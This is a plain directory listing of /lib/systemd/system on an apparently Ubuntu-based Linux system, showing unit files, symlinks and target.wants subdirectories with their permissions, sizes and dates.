-rw-r--r-- 1 root root  184 Jan 14  2021 apt-daily-upgrade.timer
-rw-r--r-- 1 root root  326 Jan 14  2021 apt-daily.service
-rw-r--r-- 1 root root  156 Jan 14  2021 apt-daily.timer
-rw-r--r-- 1 root root  310 Jan 13  2021 grub-initrd-fallback.service
lrwxrwxrwx 1 root root   14 Jan  6  2021 autovt@.service -> getty@.service
-rw-r--r-- 1 root root 1.1K Jan  6  2021 console-getty.service
-rw-r--r-- 1 root root 1.3K Jan  6  2021 container-getty@.service
lrwxrwxrwx 1 root root    9 Jan  6  2021 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan  6  2021 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Jan  6  2021 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Jan  6  2021 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Jan  6  2021 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Jan  6  2021 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   25 Jan  6  2021 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
-rw-r--r-- 1 root root 1.1K Jan  6  2021 debug-shell.service
lrwxrwxrwx 1 root root   16 Jan  6  2021 default.target -> graphical.target
-rw-r--r-- 1 root root  797 Jan  6  2021 emergency.service
-rw-r--r-- 1 root root 2.0K Jan  6  2021 getty@.service
lrwxrwxrwx 1 root root    9 Jan  6  2021 hwclock.service -> /dev/null
-rw-r--r-- 1 root root  716 Jan  6  2021 kmod-static-nodes.service
lrwxrwxrwx 1 root root   28 Jan  6  2021 kmod.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root   22 Jan  6  2021 procps.service -> systemd-sysctl.service
-rw-r--r-- 1 root root  609 Jan  6  2021 quotaon.service
-rw-r--r-- 1 root root  716 Jan  6  2021 rc-local.service
lrwxrwxrwx 1 root root    9 Jan  6  2021 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan  6  2021 rcS.service -> /dev/null
-rw-r--r-- 1 root root  788 Jan  6  2021 rescue.service
lrwxrwxrwx 1 root root   15 Jan  6  2021 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Jan  6  2021 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Jan  6  2021 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Jan  6  2021 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Jan  6  2021 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Jan  6  2021 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Jan  6  2021 runlevel6.target -> reboot.target
-rw-r--r-- 1 root root 1.5K Jan  6  2021 serial-getty@.service
-rw-r--r-- 1 root root  830 Jan  6  2021 sys-kernel-config.mount
-rw-r--r-- 1 root root  719 Jan  6  2021 systemd-backlight@.service
-rw-r--r-- 1 root root 1.1K Jan  6  2021 systemd-binfmt.service
-rw-r--r-- 1 root root  678 Jan  6  2021 systemd-bless-boot.service
-rw-r--r-- 1 root root  718 Jan  6  2021 systemd-boot-check-no-failures.service
-rw-r--r-- 1 root root  740 Jan  6  2021 systemd-fsck-root.service
-rw-r--r-- 1 root root  741 Jan  6  2021 systemd-fsck@.service
-rw-r--r-- 1 root root  551 Jan  6  2021 systemd-fsckd.service
-rw-r--r-- 1 root root  540 Jan  6  2021 systemd-fsckd.socket
-rw-r--r-- 1 root root  671 Jan  6  2021 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  541 Jan  6  2021 systemd-hibernate.service
-rw-r--r-- 1 root root 1.2K Jan  6  2021 systemd-hostnamed.service
-rw-r--r-- 1 root root  813 Jan  6  2021 systemd-hwdb-update.service
-rw-r--r-- 1 root root  559 Jan  6  2021 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  566 Jan  6  2021 systemd-initctl.service
-rw-r--r-- 1 root root  686 Jan  6  2021 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.6K Jan  6  2021 systemd-journald.service
-rw-r--r-- 1 root root 1.5K Jan  6  2021 systemd-journald@.service
-rw-r--r-- 1 root root 1.2K Jan  6  2021 systemd-localed.service
-rw-r--r-- 1 root root 2.1K Jan  6  2021 systemd-logind.service
-rw-r--r-- 1 root root 1.1K Jan  6  2021 systemd-modules-load.service
-rw-r--r-- 1 root root  635 Jan  6  2021 systemd-network-generator.service
-rw-r--r-- 1 root root  740 Jan  6  2021 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root 2.0K Jan  6  2021 systemd-networkd.service
-rw-r--r-- 1 root root  735 Jan  6  2021 systemd-pstore.service
-rw-r--r-- 1 root root  655 Jan  6  2021 systemd-quotacheck.service
-rw-r--r-- 1 root root 1.1K Jan  6  2021 systemd-random-seed.service
-rw-r--r-- 1 root root  767 Jan  6  2021 systemd-remount-fs.service
-rw-r--r-- 1 root root 1.7K Jan  6  2021 systemd-resolved.service
-rw-r--r-- 1 root root  717 Jan  6  2021 systemd-rfkill.service
-rw-r--r-- 1 root root  596 Jan  6  2021 systemd-suspend-then-hibernate.service
-rw-r--r-- 1 root root  537 Jan  6  2021 systemd-suspend.service
-rw-r--r-- 1 root root  693 Jan  6  2021 systemd-sysctl.service
-rw-r--r-- 1 root root 1.2K Jan  6  2021 systemd-time-wait-sync.service
-rw-r--r-- 1 root root 1.2K Jan  6  2021 systemd-timedated.service
-rw-r--r-- 1 root root 1.5K Jan  6  2021 systemd-timesyncd.service
-rw-r--r-- 1 root root 1.2K Jan  6  2021 systemd-udevd.service
-rw-r--r-- 1 root root  797 Jan  6  2021 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  794 Jan  6  2021 systemd-update-utmp.service
-rw-r--r-- 1 root root  628 Jan  6  2021 systemd-user-sessions.service
-rw-r--r-- 1 root root  690 Jan  6  2021 systemd-volatile-root.service
lrwxrwxrwx 1 root root   21 Jan  6  2021 udev.service -> systemd-udevd.service
-rw-r--r-- 1 root root  688 Jan  6  2021 user-runtime-dir@.service
-rw-r--r-- 1 root root  748 Jan  6  2021 user@.service
lrwxrwxrwx 1 root root    9 Jan  6  2021 x11-common.service -> /dev/null
-rw-r--r-- 1 root root  342 Jan  6  2021 getty-static.service
-rw-r--r-- 1 root root  362 Jan  6  2021 ondemand.service
-rw-r--r-- 1 root root  880 Nov 19  2020 snapd.apparmor.service
-rw-r--r-- 1 root root  432 Nov 19  2020 snapd.autoimport.service
-rw-r--r-- 1 root root  369 Nov 19  2020 snapd.core-fixup.service
-rw-r--r-- 1 root root  151 Nov 19  2020 snapd.failure.service
-rw-r--r-- 1 root root  524 Nov 19  2020 snapd.recovery-chooser-trigger.service
-rw-r--r-- 1 root root  322 Nov 19  2020 snapd.seeded.service
-rw-r--r-- 1 root root  475 Nov 19  2020 snapd.service
-rw-r--r-- 1 root root  464 Nov 19  2020 snapd.snap-repair.service
-rw-r--r-- 1 root root  373 Nov 19  2020 snapd.snap-repair.timer
-rw-r--r-- 1 root root  281 Nov 19  2020 snapd.socket
-rw-r--r-- 1 root root  608 Nov 19  2020 snapd.system-shutdown.service
-rw-r--r-- 1 root root  741 Nov  2  2020 accounts-daemon.service
-rw-r--r-- 1 root root  447 Nov  2  2020 plymouth-halt.service
-rw-r--r-- 1 root root  461 Nov  2  2020 plymouth-kexec.service
lrwxrwxrwx 1 root root   27 Nov  2  2020 plymouth-log.service -> plymouth-read-write.service
-rw-r--r-- 1 root root  456 Nov  2  2020 plymouth-poweroff.service
-rw-r--r-- 1 root root  200 Nov  2  2020 plymouth-quit-wait.service
-rw-r--r-- 1 root root  194 Nov  2  2020 plymouth-quit.service
-rw-r--r-- 1 root root  244 Nov  2  2020 plymouth-read-write.service
-rw-r--r-- 1 root root  449 Nov  2  2020 plymouth-reboot.service
-rw-r--r-- 1 root root  567 Nov  2  2020 plymouth-start.service
-rw-r--r-- 1 root root  291 Nov  2  2020 plymouth-switch-root.service
lrwxrwxrwx 1 root root   21 Nov  2  2020 plymouth.service -> plymouth-quit.service
-rw-r--r-- 1 root root  525 Nov  2  2020 systemd-ask-password-plymouth.path
-rw-r--r-- 1 root root  502 Nov  2  2020 systemd-ask-password-plymouth.service
-rw-r--r-- 1 root root  481 Sep 28  2020 mdadm-grow-continue@.service
-rw-r--r-- 1 root root  210 Sep 28  2020 mdadm-last-resort@.service
-rw-r--r-- 1 root root  179 Sep 28  2020 mdadm-last-resort@.timer
-rw-r--r-- 1 root root  535 Sep 28  2020 mdcheck_continue.service
-rw-r--r-- 1 root root  435 Sep 28  2020 mdcheck_continue.timer
-rw-r--r-- 1 root root  483 Sep 28  2020 mdcheck_start.service
-rw-r--r-- 1 root root  463 Sep 28  2020 mdcheck_start.timer
-rw-r--r-- 1 root root 1.1K Sep 28  2020 mdmon@.service
-rw-r--r-- 1 root root  463 Sep 28  2020 mdmonitor-oneshot.service
-rw-r--r-- 1 root root  434 Sep 28  2020 mdmonitor-oneshot.timer
-rw-r--r-- 1 root root  388 Sep 28  2020 mdmonitor.service
-rw-r--r-- 1 root root  407 Sep 23  2020 packagekit-offline-update.service
-rw-r--r-- 1 root root  371 Sep 23  2020 packagekit.service
-rw-r--r-- 1 root root  254 Sep 21  2020 thermald.service
-rw-r--r-- 1 root root  396 Sep 10  2020 finalrd.service
-rw-r--r-- 1 root root  626 Sep 10  2020 bolt.service
-rw-r--r-- 1 root root  435 Aug  4  2020 rsyslog.service
-rw-r--r-- 1 root root  466 Jul 21  2020 fstrim.service
-rw-r--r-- 1 root root  205 Jul 21  2020 fstrim.timer
-rw-r--r-- 1 root root  538 Jul 21  2020 uuidd.service
-rw-r--r-- 1 root root  126 Jul 21  2020 uuidd.socket
-rw-r--r-- 1 root root  406 Jun 18  2020 fwupd-offline-update.service
-rw-r--r-- 1 root root  424 Jun 18  2020 fwupd-refresh.service
-rw-r--r-- 1 root root  571 Jun 18  2020 fwupd.service
-rw-r--r-- 1 root root  159 Jun 18  2020 fwupd-refresh.timer
-rw-r--r-- 1 root root  173 Jun 15  2020 motd-news.service
-rw-r--r-- 1 root root  161 Jun 15  2020 motd-news.timer
-rw-r--r-- 1 root root  505 Jun 11  2020 dbus.service
-rw-r--r-- 1 root root  106 Jun 11  2020 dbus.socket
-rw-r--r-- 1 root root  184 May 29  2020 rescue-ssh.target
-rw-r--r-- 1 root root  538 May 29  2020 ssh.service
-rw-r--r-- 1 root root  216 May 29  2020 ssh.socket
-rw-r--r-- 1 root root  289 May 29  2020 ssh@.service
-rw-r--r-- 1 root root  463 May 11  2020 iscsid.service
-rw-r--r-- 1 root root  175 May 11  2020 iscsid.socket
-rw-r--r-- 1 root root  987 May 11  2020 open-iscsi.service
drwxr-xr-x 2 root root 4.0K Apr 22  2020 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K Apr 22  2020 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Apr 22  2020 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Apr 22  2020 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Apr 22  2020 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Apr 22  2020 runlevel5.target.wants
-rw-r--r-- 1 root root  603 Apr 13  2020 apache-htcacheclean.service
-rw-r--r-- 1 root root  612 Apr 13  2020 apache-htcacheclean@.service
-rw-r--r-- 1 root root  395 Apr 13  2020 apache2.service
-rw-r--r-- 1 root root  467 Apr 13  2020 apache2@.service
-rw-r--r-- 1 root root 1.2K Apr 10  2020 apparmor.service
lrwxrwxrwx 1 root root    9 Apr  6  2020 multipath-tools-boot.service -> /dev/null
lrwxrwxrwx 1 root root   18 Apr  6  2020 multipath-tools.service -> multipathd.service
-rw-r--r-- 1 root root  807 Apr  6  2020 multipathd.service
-rw-r--r-- 1 root root  186 Apr  6  2020 multipathd.socket
-rw-r--r-- 1 root root  919 Apr  1  2020 basic.target
-rw-r--r-- 1 root root  441 Apr  1  2020 blockdev@.target
-rw-r--r-- 1 root root  419 Apr  1  2020 bluetooth.target
-rw-r--r-- 1 root root  455 Apr  1  2020 boot-complete.target
-rw-r--r-- 1 root root  465 Apr  1  2020 cryptsetup-pre.target
-rw-r--r-- 1 root root  412 Apr  1  2020 cryptsetup.target
-rw-r--r-- 1 root root  750 Apr  1  2020 dev-hugepages.mount
-rw-r--r-- 1 root root  693 Apr  1  2020 dev-mqueue.mount
-rw-r--r-- 1 root root  471 Apr  1  2020 emergency.target
-rw-r--r-- 1 root root  541 Apr  1  2020 exit.target
-rw-r--r-- 1 root root  480 Apr  1  2020 final.target
-rw-r--r-- 1 root root  506 Apr  1  2020 getty-pre.target
-rw-r--r-- 1 root root  500 Apr  1  2020 getty.target
-rw-r--r-- 1 root root  598 Apr  1  2020 graphical.target
-rw-r--r-- 1 root root  527 Apr  1  2020 halt.target
-rw-r--r-- 1 root root  509 Apr  1  2020 hibernate.target
-rw-r--r-- 1 root root  530 Apr  1  2020 hybrid-sleep.target
-rw-r--r-- 1 root root  665 Apr  1  2020 initrd-cleanup.service
-rw-r--r-- 1 root root  528 Apr  1  2020 initrd-fs.target
-rw-r--r-- 1 root root  815 Apr  1  2020 initrd-parse-etc.service
-rw-r--r-- 1 root root  496 Apr  1  2020 initrd-root-device.target
-rw-r--r-- 1 root root  501 Apr  1  2020 initrd-root-fs.target
-rw-r--r-- 1 root root  584 Apr  1  2020 initrd-switch-root.service
-rw-r--r-- 1 root root  777 Apr  1  2020 initrd-switch-root.target
-rw-r--r-- 1 root root  813 Apr  1  2020 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  698 Apr  1  2020 initrd.target
-rw-r--r-- 1 root root  541 Apr  1  2020 kexec.target
-rw-r--r-- 1 root root  435 Apr  1  2020 local-fs-pre.target
-rw-r--r-- 1 root root  482 Apr  1  2020 local-fs.target
-rw-r--r-- 1 root root  445 Apr  1  2020 machine.slice
-rw-r--r-- 1 root root  577 Apr  1  2020 modprobe@.service
-rw-r--r-- 1 root root  532 Apr  1  2020 multi-user.target
-rw-r--r-- 1 root root  505 Apr  1  2020 network-online.target
-rw-r--r-- 1 root root  502 Apr  1  2020 network-pre.target
-rw-r--r-- 1 root root  521 Apr  1  2020 network.target
-rw-r--r-- 1 root root  554 Apr  1  2020 nss-lookup.target
-rw-r--r-- 1 root root  513 Apr  1  2020 nss-user-lookup.target
-rw-r--r-- 1 root root  394 Apr  1  2020 paths.target
-rw-r--r-- 1 root root  592 Apr  1  2020 poweroff.target
-rw-r--r-- 1 root root  417 Apr  1  2020 printer.target
-rw-r--r-- 1 root root  745 Apr  1  2020 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  718 Apr  1  2020 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  583 Apr  1  2020 reboot.target
-rw-r--r-- 1 root root  549 Apr  1  2020 remote-cryptsetup.target
-rw-r--r-- 1 root root  436 Apr  1  2020 remote-fs-pre.target
-rw-r--r-- 1 root root  522 Apr  1  2020 remote-fs.target
-rw-r--r-- 1 root root  492 Apr  1  2020 rescue.target
-rw-r--r-- 1 root root  540 Apr  1  2020 rpcbind.target
-rw-r--r-- 1 root root  442 Apr  1  2020 shutdown.target
-rw-r--r-- 1 root root  402 Apr  1  2020 sigpwr.target
-rw-r--r-- 1 root root  460 Apr  1  2020 sleep.target
-rw-r--r-- 1 root root  449 Apr  1  2020 slices.target
-rw-r--r-- 1 root root  420 Apr  1  2020 smartcard.target
-rw-r--r-- 1 root root  396 Apr  1  2020 sockets.target
-rw-r--r-- 1 root root  420 Apr  1  2020 sound.target
-rw-r--r-- 1 root root  577 Apr  1  2020 suspend-then-hibernate.target
-rw-r--r-- 1 root root  503 Apr  1  2020 suspend.target
-rw-r--r-- 1 root root  393 Apr  1  2020 swap.target
-rw-r--r-- 1 root root  823 Apr  1  2020 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  738 Apr  1  2020 sys-kernel-debug.mount
-rw-r--r-- 1 root root  764 Apr  1  2020 sys-kernel-tracing.mount
-rw-r--r-- 1 root root  558 Apr  1  2020 sysinit.target
-rw-r--r-- 1 root root 1.4K Apr  1  2020 syslog.socket
-rw-r--r-- 1 root root  434 Apr  1  2020 system-systemd-cryptsetup.slice
-rw-r--r-- 1 root root 1.4K Apr  1  2020 system-update-cleanup.service
-rw-r--r-- 1 root root  543 Apr  1  2020 system-update-pre.target
-rw-r--r-- 1 root root  617 Apr  1  2020 system-update.target
-rw-r--r-- 1 root root  722 Apr  1  2020 systemd-ask-password-console.path
-rw-r--r-- 1 root root  737 Apr  1  2020 systemd-ask-password-console.service
-rw-r--r-- 1 root root  650 Apr  1  2020 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  742 Apr  1  2020 systemd-ask-password-wall.service
-rw-r--r-- 1 root root 1.4K Apr  1  2020 systemd-boot-system-token.service
-rw-r--r-- 1 root root  556 Apr  1  2020 systemd-exit.service
-rw-r--r-- 1 root root  579 Apr  1  2020 systemd-halt.service
-rw-r--r-- 1 root root  546 Apr  1  2020 systemd-initctl.socket
-rw-r--r-- 1 root root  773 Apr  1  2020 systemd-journal-flush.service
-rw-r--r-- 1 root root 1.2K Apr  1  2020 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root  597 Apr  1  2020 systemd-journald-varlink@.socket
-rw-r--r-- 1 root root  882 Apr  1  2020 systemd-journald.socket
-rw-r--r-- 1 root root  738 Apr  1  2020 systemd-journald@.socket
-rw-r--r-- 1 root root  592 Apr  1  2020 systemd-kexec.service
-rw-r--r-- 1 root root  728 Apr  1  2020 systemd-machine-id-commit.service
-rw-r--r-- 1 root root  633 Apr  1  2020 systemd-networkd.socket
-rw-r--r-- 1 root root  556 Apr  1  2020 systemd-poweroff.service
-rw-r--r-- 1 root root  551 Apr  1  2020 systemd-reboot.service
-rw-r--r-- 1 root root  726 Apr  1  2020 systemd-rfkill.socket
-rw-r--r-- 1 root root  695 Apr  1  2020 systemd-sysusers.service
-rw-r--r-- 1 root root  658 Apr  1  2020 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  490 Apr  1  2020 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  739 Apr  1  2020 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  779 Apr  1  2020 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  852 Apr  1  2020 systemd-udev-settle.service
-rw-r--r-- 1 root root  753 Apr  1  2020 systemd-udev-trigger.service
-rw-r--r-- 1 root root  635 Apr  1  2020 systemd-udevd-control.socket
-rw-r--r-- 1 root root  610 Apr  1  2020 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  426 Apr  1  2020 time-set.target
-rw-r--r-- 1 root root  479 Apr  1  2020 time-sync.target
-rw-r--r-- 1 root root  445 Apr  1  2020 timers.target
-rw-r--r-- 1 root root  457 Apr  1  2020 umount.target
-rw-r--r-- 1 root root  432 Apr  1  2020 user.slice
-rw-r--r-- 1 root root  498 Apr  1  2020 lxd-agent.service
-rw-r--r-- 1 root root  489 Apr  1  2020 lxd-agent-9p.service
-rw-r--r-- 1 root root  155 Mar 27  2020 phpsessionclean.service
-rw-r--r-- 1 root root  144 Mar 27  2020 phpsessionclean.timer
-rw-r--r-- 1 root root  498 Mar  9  2020 open-vm-tools.service
-rw-r--r-- 1 root root  408 Mar  9  2020 vgauth.service
-rw-r--r-- 1 root root  561 Mar  3  2020 xfs_scrub@.service
-rw-r--r-- 1 root root  376 Mar  3  2020 xfs_scrub_all.service
-rw-r--r-- 1 root root  250 Mar  3  2020 xfs_scrub_all.timer
-rw-r--r-- 1 root root  272 Mar  3  2020 xfs_scrub_fail@.service
-rw-r--r-- 1 root root  482 Feb 25  2020 man-db.service
-rw-r--r-- 1 root root  164 Feb 25  2020 man-db.timer
-rw-r--r-- 1 root root  438 Feb 14  2020 e2scrub@.service
-rw-r--r-- 1 root root  297 Feb 14  2020 e2scrub_all.service
-rw-r--r-- 1 root root  251 Feb 14  2020 e2scrub_all.timer
-rw-r--r-- 1 root root  245 Feb 14  2020 e2scrub_fail@.service
-rw-r--r-- 1 root root  550 Feb 14  2020 e2scrub_reap.service
-rw-r--r-- 1 root root  400 Feb 13  2020 blk-availability.service
-rw-r--r-- 1 root root  341 Feb 13  2020 dm-event.service
-rw-r--r-- 1 root root  248 Feb 13  2020 dm-event.socket
-rw-r--r-- 1 root root  323 Feb 13  2020 lvm2-lvmpolld.service
-rw-r--r-- 1 root root  239 Feb 13  2020 lvm2-lvmpolld.socket
-rw-r--r-- 1 root root  602 Feb 13  2020 lvm2-monitor.service
-rw-r--r-- 1 root root  338 Feb 13  2020 lvm2-pvscan@.service
lrwxrwxrwx 1 root root    9 Feb 13  2020 lvm2.service -> /dev/null
-rw-r--r-- 1 root root  454 Feb 13  2020 irqbalance.service
-rw-r--r-- 1 root root  358 Feb 11  2020 dmesg.service
-rw-r--r-- 1 root root  316 Feb 11  2020 cron.service
-rw-r--r-- 1 root root  266 Jan 21  2020 ufw.service
-rw-r--r-- 1 root root  212 Dec  4  2019 apport-autoreport.path
-rw-r--r-- 1 root root  242 Dec  4  2019 apport-autoreport.service
-rw-r--r-- 1 root root  246 Dec  4  2019 apport-forward.socket
-rw-r--r-- 1 root root  142 Dec  4  2019 apport-forward@.service
-rw-r--r-- 1 root root  312 Nov 27  2019 console-setup.service
-rw-r--r-- 1 root root  287 Nov 27  2019 keyboard-setup.service
-rw-r--r-- 1 root root  330 Nov 27  2019 setvtrgb.service
-rw-r--r-- 1 root root  355 Nov 19  2019 pollinate.service
-rw-r--r-- 1 root root  524 Nov  6  2019 mysql.service
-rw-r--r-- 1 root root  255 Oct 15  2019 rsync.service
-rw-r--r-- 1 root root  258 Aug 19  2019 networkd-dispatcher.service
-rw-r--r-- 1 root root  175 Aug 11  2019 polkit.service
-rw-r--r-- 1 root root  604 Jul  8  2019 secureboot-db.service
-rw-r--r-- 1 root root  626 Jan 29  2019 ifup@.service
-rw-r--r-- 1 root root  442 Jan 29  2019 ifupdown-pre.service
-rw-r--r-- 1 root root  279 Jan 29  2019 ifupdown-wait-online.service
-rw-r--r-- 1 root root  643 Jan 29  2019 networking.service
-rw-r--r-- 1 root root  695 Jan 21  2019 logrotate.service
-rw-r--r-- 1 root root  347 Nov 12  2018 atd.service
-rw-r--r-- 1 root root  618 Oct  2  2018 friendly-recovery.service
-rw-r--r-- 1 root root  172 Oct  2  2018 friendly-recovery.target
-rw-r--r-- 1 root root  192 Jan  4  2018 logrotate.timer

/lib/systemd/system/system-update.target.wants:
total 0
lrwxrwxrwx 1 root root 36 Sep 23  2020 packagekit-offline-update.service -> ../packagekit-offline-update.service
lrwxrwxrwx 1 root root 31 Jun 18  2020 fwupd-offline-update.service -> ../fwupd-offline-update.service

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Nov  2  2020 plymouth-halt.service -> ../plymouth-halt.service

/lib/systemd/system/initrd-switch-root.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Nov  2  2020 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 31 Nov  2  2020 plymouth-switch-root.service -> ../plymouth-switch-root.service

/lib/systemd/system/kexec.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Nov  2  2020 plymouth-kexec.service -> ../plymouth-kexec.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Jan  6  2021 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 Jan  6  2021 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Jan  6  2021 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Jan  6  2021 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Jan  6  2021 systemd-user-sessions.service -> ../systemd-user-sessions.service
lrwxrwxrwx 1 root root 29 Nov  2  2020 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
lrwxrwxrwx 1 root root 24 Nov  2  2020 plymouth-quit.service -> ../plymouth-quit.service
lrwxrwxrwx 1 root root 15 Jun 11  2020 dbus.service -> ../dbus.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 28 Nov  2  2020 plymouth-poweroff.service -> ../plymouth-poweroff.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 26 Nov  2  2020 plymouth-reboot.service -> ../plymouth-reboot.service

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 20 Jan  6  2021 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Jan  6  2021 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Jan  6  2021 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Jan  6  2021 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 Jan  6  2021 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Jan  6  2021 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Jan  6  2021 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Jan  6  2021 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 27 Jan  6  2021 sys-kernel-tracing.mount -> ../sys-kernel-tracing.mount
lrwxrwxrwx 1 root root 36 Jan  6  2021 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Jan  6  2021 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 36 Jan  6  2021 systemd-boot-system-token.service -> ../systemd-boot-system-token.service
lrwxrwxrwx 1 root root 30 Jan  6  2021 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 32 Jan  6  2021 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 27 Jan  6  2021 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 36 Jan  6  2021 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 Jan  6  2021 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 Jan  6  2021 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 Jan  6  2021 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 27 Jan  6  2021 systemd-sysusers.service -> ../systemd-sysusers.service
lrwxrwxrwx 1 root root 37 Jan  6  2021 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 Jan  6  2021 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 31 Jan  6  2021 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 24 Jan  6  2021 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 30 Jan  6  2021 systemd-update-utmp.service -> ../systemd-update-utmp.service
lrwxrwxrwx 1 root root 30 Nov  2  2020 plymouth-read-write.service -> ../plymouth-read-write.service
lrwxrwxrwx 1 root root 25 Nov  2  2020 plymouth-start.service -> ../plymouth-start.service

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 Jan  6  2021 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Jan  6  2021 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/rc-local.service.d:
total 4.0K
-rw-r--r-- 1 root root 290 Jan  6  2021 debian.conf

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 Jan  6  2021 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Jan  6  2021 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 Jan  6  2021 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 Jan  6  2021 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 Jan  6  2021 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 31 Jan  6  2021 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 Jan  6  2021 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
lrwxrwxrwx 1 root root 14 Jun 11  2020 dbus.socket -> ../dbus.socket

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Jan  6  2021 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/user-.slice.d:
total 4.0K
-rw-r--r-- 1 root root 486 Apr  1  2020 10-defaults.conf

/lib/systemd/system/user@.service.d:
total 4.0K
-rw-r--r-- 1 root root 125 Jan  6  2021 timeout.conf

/lib/systemd/system/local-fs.target.wants:
total 0

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/system-sleep:
total 4.0K
